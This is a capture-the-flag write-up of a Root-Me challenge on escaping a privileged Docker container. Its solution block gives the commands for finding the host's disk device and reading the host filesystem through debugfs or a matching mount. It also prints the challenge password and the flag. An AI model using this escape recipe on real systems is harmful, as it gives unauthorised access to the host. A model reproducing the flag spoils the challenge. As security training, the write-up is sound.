# Docker - Privileged — Root-Me PRO

- **Platform / category**: Root-Me Pro, System, Easy, 200 pts
- **Subtitle**: `--give-me-privileges`
- **Vulnerability tag**: Docker - Container Escape

## Challenge

> Your company recently took the plunge into Docker. However, you believe the
> developers haven't received enough security awareness training for it. To
> support your request, you've been asked to demonstrate that they are indeed
> failing to meet security standards.

Given `ssh root@sockets.challenges.root-me.pro -p 32231` into a Docker container running on the host, goal is to escape to the host and read a flag.

## Approach

1. SSH'd in, already `uid=0` inside the container (Alpine 3.19.9, hostname `rmp`).
2. Confirmed the container is genuinely `--privileged`:
   - `capsh --print` → `Current: =ep` (full effective capability set — all 41
     caps including `CAP_SYS_ADMIN`, `CAP_SYS_MODULE`, `CAP_SYS_RAWIO`,
     `CAP_MKNOD`).
   - Seccomp disabled (0), AppArmor unconfined.
3. Checked cgroups — v2 only, so the classic `release_agent` (cgroup v1) escape
   wasn't available. Moved on to the device-access angle instead, since a
   privileged container gets real host device nodes under `/dev`.
4. `ls -la /dev` showed `/dev/vda`, a 13GB block device owned by group `disk`
   — the host's actual disk, exposed straight into the container.
5. `fdisk -l /dev/vda` printed a garbled/fake-looking MBR (bogus CHS values,
   "HPFS/NTFS" type, "partition table entries are not in disk order") — a red
   herring; ignored it.
6. `blkid /dev/vda` → `TYPE="ext4" LABEL="/"` directly on the whole disk (no
   real partition table in use) — this is the host's root filesystem.
7. `mount /dev/vda /mnt/host` initially failed with **"Resource busy"** —
   the host already has this device mounted `rw,noatime` in its own mount
   namespace, and ext4 opens the block device exclusively, so a second mount
   with *different* options is rejected by the kernel.
8. Two working fixes:
   - Mount with the **exact same options** the host used
     (`mount -o rw,noatime /dev/vda /mnt/host`) — the kernel then reuses the
     existing superblock instead of trying to open the device again.
   - Or skip mounting altogether and read the raw ext4 image with
     `debugfs` (`apk add e2fsprogs-extra`), which opens the block device
     read-only for inspection without going through the VFS mount path at
     all — sidesteps the busy-device problem entirely.
9. Either way, listing the host root showed a `flag.txt` sitting directly at
   `/` on the host, owned by root, mode 640.

## Vulnerability

Running a container with `--privileged` drops nearly all of Docker's
container isolation: full capability set, no seccomp filtering, no AppArmor
confinement, and — critically here — real host device nodes (`/dev/vda`, the
host's own disk) are exposed inside the container. Since the container also
runs as root, that's simply raw read/write access to the entire host
filesystem, no additional bug required. "Privileged" is not a sandboxing
mode; it explicitly opts the container out of the isolation that would
otherwise contain it.

## Solution

```bash
ssh -p 32231 root@sockets.challenges.root-me.pro
# password: bOJEL#KPya5^e6NE$BDY@Znw1

# confirm privileged
capsh --print          # Current: =ep  (all caps)

# find the host disk
ls -la /dev             # -> /dev/vda, 13GB
blkid /dev/vda           # -> TYPE="ext4" LABEL="/"

# read it without needing the exact host mount options
apk add --no-cache e2fsprogs-extra
debugfs -R "ls -l /" /dev/vda        # -> flag.txt at host root
debugfs -R "cat /flag.txt" /dev/vda  # -> flag

# (alternative: mount -o rw,noatime /dev/vda /mnt/host && cat /mnt/host/flag.txt)
```

## Flag

```
RM{d33f94de38a6be23b4d4908edfc7bee4db8621b5}
```

## Lesson

- `--privileged` containers give the process real access to host device
  nodes. If you land root in a privileged container, always check `ls /dev`
  for host block devices (`/dev/sd*`, `/dev/vd*`, `/dev/nvme*`) — that alone
  is often a full host filesystem compromise, no exploit needed.
- If mounting a host device fails with "Resource busy" because it's already
  mounted elsewhere, don't give up on mount — try matching the existing
  mount options exactly (check `/proc/mounts` on donor info if visible, or
  just try common combos like `rw,noatime`/`ro,noatime`). Failing that,
  `debugfs -R "<command>" /dev/xxx` reads an ext-family filesystem straight
  off the block device without mounting at all, which avoids exclusive-open
  conflicts entirely — useful for read-only recon even when you can't get a
  clean mount.
- Don't trust `fdisk -l` blindly on a device you're inspecting for the first
  time — a garbled/decoy partition table is common in these challenges;
  `blkid` (reads filesystem superblock magic directly) is more reliable for
  figuring out what's actually on a device.
